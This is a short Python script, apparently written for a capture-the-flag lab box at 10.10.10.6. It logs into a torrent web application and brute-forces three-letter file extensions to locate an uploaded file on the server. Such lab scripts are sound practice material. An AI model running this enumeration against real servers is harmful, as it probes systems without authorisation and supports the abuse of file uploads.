import requests, sys, time

filename = "b44b82a4bc6c35f6ad5e9fceefef9509c17fba74" #CHANGE THIS
directory = "torrents"                                #CHANGE THIS

#Obtain a session cookie for a logged in user
data = {"username":"x","password":"x"}
r = requests.post("http://10.10.10.6/torrent/login.php", data=data, allow_redirects=False)
sessionCookie = r.headers["Set-Cookie"].split(";")[0]
headers = {"Cookie":""+sessionCookie}

#Generate extensions
validChars= "abcdefghijklmnopqrstuvwxyz"
extensions = [i+j+k for i in validChars for j in validChars for k in validChars]

#Brute force extensions
startTime = time.time()
for extension in extensions:
    elTime = str(int(time.time() - startTime))
    print("Extension: '%s'. Elapsed time: %s seconds." % (extension,elTime), end="\r")

    URL = "http://10.10.10.6/torrent/"+directory+"/"+filename+"."+extension
    r = requests.get(URL, headers=headers)
    if r.status_code != 404:
        print("Found URL: " + URL)
        print("The URL was found in %s seconds" % int(time.time() - startTime))
        sys.exit(0)